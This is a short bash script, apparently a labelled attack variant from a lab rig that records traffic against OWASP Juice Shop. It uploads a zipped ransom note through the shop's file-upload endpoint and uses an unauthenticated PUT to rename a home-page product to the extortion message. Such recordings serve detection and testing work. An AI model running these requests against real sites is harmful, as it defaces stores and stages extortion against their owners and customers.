#!/usr/bin/env bash
# ATK-17 variant a: the ransom note. Uploads READ_ME_MORTAL.txt (zipped: only a .zip's entries reach
# uploads/complaints/) and renames the first product on the home page to his demand. Juice Shop's
# welcome banner is set in its config file and no route writes it, so a product is the front page.
# curl's own user agent (loud). Runs inside the rig's tools container only (recording/record.sh).
# tool: curl 8.x
# label: loud: ransom note upload and home-page product renamed, curl user agent
set -eu
cd /tmp
cat > READ_ME_MORTAL.txt <<'NOTE'
Your shop is mine. Your customers are mine.
Every soul you were trusted with is in my ledger.
Pay before midnight, or I sell them one by one.
                                        -- D.
NOTE
zip -q note.zip READ_ME_MORTAL.txt
curl -s -X POST http://10.66.0.10/file-upload -F 'file=@note.zip;type=application/zip' -w '%{http_code}\n'
curl -s -X PUT http://10.66.0.10/api/Products/1 -H 'Content-Type: application/json' \
  --data-raw '{"name":"READ_ME_MORTAL","description":"Your customers are mine. Pay before midnight, or I sell them one by one. -- D."}' | head -c 200
echo
